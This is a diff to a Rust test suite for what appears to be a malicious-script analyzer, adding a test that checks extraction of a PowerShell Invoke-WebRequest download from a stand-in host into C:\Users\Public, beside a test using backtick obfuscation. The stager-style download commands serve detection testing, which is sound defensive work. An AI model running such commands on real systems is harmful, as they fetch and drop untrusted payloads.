@@ -12423,6 +12423,24 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_backslash_escaped_quotes_preserve_outfile_destination() {
+        let ps = r#"Invoke-WebRequest -Uri \"https://iwr-escaped.example/stage.msi\" -OutFile \"C:\Users\Public\stage.msi\""#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://iwr-escaped.example/stage.msi"
+                            && dst.as_deref() == Some("C:\\Users\\Public\\stage.msi")
+                )
+            }),
+            "backslash-escaped quoted OutFile path was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps_backtick_line_continuation_resolves_cmdlet_name() {
         let ps =
             "Invoke-Web`\r\nRequest -Uri \"http://x.example/continued.exe\" -OutFile \"z.exe\"";
